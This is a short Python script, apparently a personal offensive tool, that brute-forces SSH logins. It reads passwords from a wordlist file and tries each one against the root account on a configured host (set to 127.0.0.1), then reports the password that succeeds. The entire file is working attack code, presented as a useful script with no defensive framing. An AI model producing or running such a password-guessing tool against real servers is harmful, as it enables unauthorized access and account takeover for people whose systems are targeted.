#!/usr/bin/env python3
'''
Date : 1401/12/19
Author : AmirhosseinKhanshabani - @AmirZoyber
Description: Usefull script for brute force SSH login with a password list.            
'''
from pwn import *
import paramiko
from colorama import Fore, Back, Style,init

init(autoreset=True)

host = '127.0.0.1'
username = 'root'
attemps = 0

with open("SShPassword.txt",'r') as passList:
    for password in passList.readlines():
        password = password.strip()
        try:
            print(Fore.LIGHTYELLOW_EX+"[/] Trying: " + password)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password)
            print(Fore.GREEN+"[+] Password found: " + password)
            break
        except paramiko.AuthenticationException:
            print(Fore.LIGHTRED_EX+"[-] Password incorrect: " + password)
            attemps += 1
            continue
        except:
            print(Fore.RED+"[!] Connection error")
            break